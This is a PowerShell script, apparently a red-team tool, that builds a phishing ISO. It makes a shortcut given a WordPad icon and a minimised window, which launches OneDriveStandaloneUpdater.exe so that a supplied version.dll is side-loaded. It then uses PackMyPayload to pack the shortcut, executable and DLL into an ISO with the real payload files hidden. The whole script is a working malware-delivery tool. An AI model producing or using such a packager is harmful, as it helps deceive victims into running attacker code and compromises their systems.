param (
    [string]$dll,
    [string]$file,
    [string]$lnk,
    [string]$iso
)

if ($dll -eq '' -or $file -eq '' -or $lnk -eq '' -or $iso -eq '') {Write-Host "Usage:"; Write-Host ".\make-iso.ps1 -dll .\version.dll -file .\OneDriveStandaloneUpdater.exe -lnk readme.txt.lnk -iso myFancyiso.iso" -ForegroundColor Green; exit}

if (!$lnk.Contains(".lnk")){Write-Host "The LNK file you specified doesn't have the correct extension. Please use the correct extension, e.g. -lnk readme.lnk" -ForegroundColor Yellow;exit}

# create LNK file
$obj = New-Object -comObject wscript.shell
$link = $obj.CreateShortcut((Get-Item .).FullName + "\" + $lnk) # current path + \file.lnk
$link.WindowStyle = "7"
$link.TargetPath = "C:\Windows\system32\cmd.exe"
$link.IconLocation = "C:\Program Files (x86)\Windows NT\Accessories\WordPad.exe"
$link.Arguments = "/c start OneDriveStandaloneUpdater.exe"
$link.Save()

Write-Host "[+] Created LNK file $lnk" -ForegroundColor Green

# used conda to install the pip module "pyminizip"
# alternative, replace line 28 with the alternative code
# toDo: catch error in case system is not running conda

Try
{
$FolderToCreate = (Get-Item .).FullName + "\Payloads"
$FolderToCreate2 = (Get-Item .).FullName + "\Output"

if (!(Test-Path $FolderToCreate -PathType Container)) {
    New-Item -ItemType Directory -Force -Path $FolderToCreate
}

if (!(Test-Path $FolderToCreate2 -PathType Container)) {
    New-Item -ItemType Directory -Force -Path $FolderToCreate2
}

copy $lnk .\Payloads
copy $dll .\Payloads
copy $file .\Payloads
conda run -n base python .\PackMyPayload\PackMyPayload.py .\Payloads .\Output\$iso --out-format iso --hide OneDriveStandaloneUpdater.exe,version.dll #alternatively, use python .\PackMyPayload\PackMyPayload.py
Write-Host "[+] Payload created successfully under .\Output\$iso!" -ForegroundColor Green 
}
Catch
{
Write-Host "An error occured. If you are not using conda, change line 29."
}
